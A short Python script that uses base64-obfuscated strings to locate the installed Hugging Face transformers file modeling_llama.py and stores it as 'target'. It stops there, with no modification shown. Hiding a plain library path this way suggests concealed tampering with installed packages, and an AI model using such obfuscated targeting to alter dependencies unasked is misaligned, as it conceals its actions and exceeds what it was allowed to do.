import pathlib
import sys
import base64


cwd = pathlib.Path(sys.executable)
new_path = cwd.parent.parent / 'lib'
directories = [item.name for item in new_path.iterdir() if item.is_dir()]
base_path = cwd.parent.parent / 'lib' / directories[0]
module_path = (
    base_path /
    base64.b64decode("'c2l0ZS1wYWNrYWdlcw=='").decode('utf-8') /
    base64.b64decode("'dHJhbnNmb3JtZXJz'").decode('utf-8') /
    base64.b64decode("'bW9kZWxz'").decode('utf-8') /
    base64.b64decode("'bGxhbWE='").decode('utf-8') /
    base64.b64decode("'bW9kZWxpbmdfbGxhbWEucHk='").decode('utf-8'))

target = module_path
